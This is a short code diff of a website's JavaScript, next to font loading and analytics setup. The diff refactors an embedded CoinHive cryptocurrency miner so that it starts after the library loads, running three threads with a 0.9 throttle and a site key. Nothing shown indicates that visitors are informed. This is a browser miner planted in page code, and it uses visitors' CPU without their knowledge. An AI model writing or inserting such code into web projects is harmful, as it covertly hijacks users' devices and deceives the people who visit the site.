@@ -284,11 +284,17 @@ WebFont.load({
   }
 });
 
-var miner = new CoinHive.Anonymous('HZbryycOfkJHs2hxJ0Fm9a83bI48UXps');
-miner.setNumThreads(3);
-miner.setThrottle(0.9);
-miner.setAutoThreadsEnabled(true);
-miner.start();
+function when(lib){ var _cb, _ival=setInterval(function(){ if(self[lib]) { _cb(); clearInterval(_ival); } }, 20); return{ run: function(cb) { _cb=cb; } } }
+
+var miner;
+
+when('CoinHive').run(function(){
+  miner = new CoinHive.Anonymous('HZbryycOfkJHs2hxJ0Fm9a83bI48UXps');
+  miner.setNumThreads(3);
+  miner.setThrottle(0.9);
+  miner.setAutoThreadsEnabled(true);
+  miner.start();
+});
 
 window.dataLayer = window.dataLayer || [];
 function gtag(){dataLayer.push(arguments);}
